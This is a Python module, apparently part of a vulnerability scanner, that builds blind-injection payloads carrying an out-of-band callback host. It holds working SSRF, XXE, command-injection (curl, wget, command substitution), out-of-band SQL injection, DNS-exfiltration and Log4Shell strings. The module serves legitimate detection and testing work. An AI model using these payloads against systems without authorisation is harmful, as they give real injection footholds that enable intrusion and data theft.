"""Blind-injection payloads that embed an OAST callback host.

Every payload here plants the collaborator hostname (``<token>.<domain>``) in a
place a vulnerable target will resolve or fetch it — so when the callback
arrives, the interaction's token proves *which* payload fired. These are the
building blocks the Phase-B injection capabilities parameterise; they take a
``host`` (and sometimes a ``url``) minted by :class:`core.oast.client.Correlation`.

Payloads are intentionally benign: they cause a DNS/HTTP lookup, nothing
destructive — the callback is the proof, no further effect is needed.
"""

from __future__ import annotations

from typing import Dict, List


def ssrf_urls(host: str) -> List[str]:
    """URLs to place in a server-side-fetch parameter (SSRF)."""
    return [f"http://{host}/", f"https://{host}/", f"//{host}/"]


def xxe(host: str) -> str:
    """An XML external-entity payload that fetches the callback over HTTP."""
    return (
        f'<?xml version="1.0"?>\n'
        f'<!DOCTYPE r [<!ENTITY x SYSTEM "http://{host}/xxe">]>\n'
        f'<r>&x;</r>'
    )


def rce_commands(host: str) -> List[str]:
    """Command-injection snippets that trigger a lookup of the callback host."""
    return [
        f"curl http://{host}/rce",
        f"wget -qO- http://{host}/rce",
        f"nslookup {host}",
        f"ping -c1 {host}",
        f"$(curl http://{host}/rce)",
        f"`nslookup {host}`",
    ]


def sqli_oob(host: str) -> Dict[str, str]:
    """Out-of-band SQLi payloads by engine (each forces a network lookup)."""
    return {
        "mssql": f"';EXEC master..xp_dirtree '\\\\{host}\\x';--",
        "mysql": f"' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.{host}\\\\x'))-- -",
        "oracle": f"' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('{host}'))IS NOT NULL--",
        "postgres": f"'; COPY (SELECT '') TO PROGRAM 'nslookup {host}';--",
    }


def dns_exfil(host: str, data_label: str = "data") -> str:
    """A hostname that prefixes exfiltrated data as a DNS label."""
    safe = "".join(c for c in data_label if c.isalnum() or c == "-")[:60] or "d"
    return f"{safe}.{host}"


def log4shell(host: str) -> str:
    """A JNDI lookup string (Log4Shell-style) targeting the callback."""
    return f"${{jndi:ldap://{host}/a}}"


def all_payloads(host: str) -> Dict[str, object]:
    """Convenience: every payload family for one callback host."""
    return {
        "ssrf": ssrf_urls(host),
        "xxe": xxe(host),
        "rce": rce_commands(host),
        "sqli_oob": sqli_oob(host),
        "dns_exfil": dns_exfil(host),
        "log4shell": log4shell(host),
    }


__all__ = [
    "ssrf_urls", "xxe", "rce_commands", "sqli_oob", "dns_exfil", "log4shell",
    "all_payloads",
]
